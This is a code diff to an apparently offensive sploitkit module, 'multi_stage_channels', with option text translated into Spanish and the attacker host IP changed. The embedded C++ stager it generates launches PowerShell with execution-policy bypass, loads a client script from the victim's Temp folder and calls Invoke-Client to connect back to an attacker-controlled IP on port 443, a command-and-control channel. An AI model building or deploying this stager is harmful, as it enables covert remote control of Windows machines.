@@ -1,7 +1,6 @@
 from sploitkit import *
 import os
 import subprocess
-from template import Procedure
 import time
 
 class multi_stage_channels(Module):
@@ -15,25 +14,25 @@ class multi_stage_channels(Module):
 	config  = Config({
         Option(
             'PAYLOAD',
-            "Name of the ps1 payload.",
+            "Nombre del script ps1",
             True,
             #set_callback=lambda o: o.root._set_app_folder(),
         ): "my_client",
          Option(
             'LHOST',
-            "Your IP address.",
+            "Tu direccion IP.",
             True,
             #set_callback=lambda o: o.root._set_logging(o.value),
         ): "0.0.0.0",
         Option(
             'EXE_NAME',
-            "Name of the EXE.",
+            "Nombre del exe.",
             True,
             #set_callback=lambda o: o.root._set_logging(o.value),
-        ): "name.c",
+        ): "name.cpp",
 		Option(
             'OUTPUT',
-            "Path of the output folder.",
+            "Path del folder donde se colocan las salidas.",
             True,
             #set_callback=lambda o: o.root._set_logging(o.value),
         ): " ",
@@ -50,7 +49,7 @@ class multi_stage_channels(Module):
 
 
 		c2client = "client.ps1"
-		lhost = "192.168.114.129"
+		lhost = "10.10.1.13"
 		name = 'ejecutarPSs.cpp'
 		fullname = parent_path+name
 		exename = "ejecuta"
@@ -78,6 +77,7 @@ class multi_stage_channels(Module):
 		       string user(username);      
 		       string ruta_script = "C:\\\\Users\\\\" + user + "\\\\AppData\\\\Local\\\\Temp\\\\" + nombre_script;
 		       string strCMD = "start powershell.exe -executionpolicy bypass -Command \\"&Import-Module "+ruta_script+"; Invoke-Client -ServerIP "+ipaddr+" -Port 443\\"";
+		       printf("%%s\\n",strCMD.c_str());
 		       system(strCMD.c_str()); //si -windowstyle hidden, entonces se ejecuta en segundo plano.
 
 		}
